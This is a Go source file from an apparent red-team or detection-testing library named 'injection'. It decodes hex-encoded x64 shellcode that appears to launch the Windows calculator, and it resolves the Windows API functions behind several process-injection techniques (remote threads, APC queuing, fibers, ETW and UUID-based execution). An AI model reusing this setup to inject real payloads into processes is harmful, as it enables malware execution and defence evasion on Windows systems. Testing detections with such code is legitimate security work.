package injection

import (
	"encoding/hex"

	"golang.org/x/sys/windows"
)

var shellcode []byte
var VirtualAlloc *windows.LazyProc
var VirtualAllocEx *windows.LazyProc
var VirtualProtect *windows.LazyProc
var VirtualProtectEx *windows.LazyProc
var RtlCopyMemory *windows.LazyProc
var ReadProcessMemory *windows.LazyProc
var WriteProcessMemory *windows.LazyProc
var HeapCreate *windows.LazyProc
var HeapAlloc *windows.LazyProc
var EtwpCreateEtwThread *windows.LazyProc
var WaitForSingleObject *windows.LazyProc
var CreateRemoteThread *windows.LazyProc
var CloseHandle *windows.LazyProc
var GetCurrentThread *windows.LazyProc
var RtlCreateUserThread *windows.LazyProc
var CreateThread *windows.LazyProc
var NtQueryInformationProcess *windows.LazyProc
var ConvertThreadToFiber *windows.LazyProc
var CreateFiber *windows.LazyProc
var SwitchToFiber *windows.LazyProc
var QueueUserAPC *windows.LazyProc
var NtQueueApcThreadEx *windows.LazyProc
var EnumSystemLocalesA *windows.LazyProc
var UuidFromString *windows.LazyProc

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)

func init() {
	// TODO: Move from global variable to config objects, remove need for init
	shellcode, _ = hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")

	// Loading related DLL's
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	rpcrt4 := windows.NewLazySystemDLL("Rpcrt4.dll")

	// Virtual memory space
	VirtualAlloc = kernel32.NewProc("VirtualAlloc")
	VirtualAllocEx = kernel32.NewProc("VirtualAllocEx")
	VirtualProtect = kernel32.NewProc("VirtualProtect")
	VirtualProtectEx = kernel32.NewProc("VirtualProtectEx")

	// Memory functions
	RtlCopyMemory = ntdll.NewProc("RtlCopyMemory")
	ReadProcessMemory = kernel32.NewProc("ReadProcessMemory")
	WriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	HeapCreate = kernel32.NewProc("HeapCreate")
	HeapAlloc = kernel32.NewProc("HeapAlloc")

	// Specific to CreateEtwThread
	EtwpCreateEtwThread = ntdll.NewProc("EtwpCreateEtwThread")

	// Process actions
	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	NtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
	CreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	CloseHandle = kernel32.NewProc("CloseHandle")
	GetCurrentThread = kernel32.NewProc("GetCurrentThread")
	RtlCreateUserThread = ntdll.NewProc("RtlCreateUserThread")
	CreateThread = kernel32.NewProc("CreateThread")

	// Fiber actions
	ConvertThreadToFiber = kernel32.NewProc("ConvertThreadToFiber")
	CreateFiber = kernel32.NewProc("CreateFiber")
	SwitchToFiber = kernel32.NewProc("SwitchToFiber")

	// APC actions
	QueueUserAPC = kernel32.NewProc("QueueUserAPC")
	NtQueueApcThreadEx = ntdll.NewProc("NtQueueApcThreadEx")

	// Specific to UUIDFromString
	EnumSystemLocalesA = kernel32.NewProc("EnumSystemLocalesA")
	UuidFromString = rpcrt4.NewProc("UuidFromStringA")
}
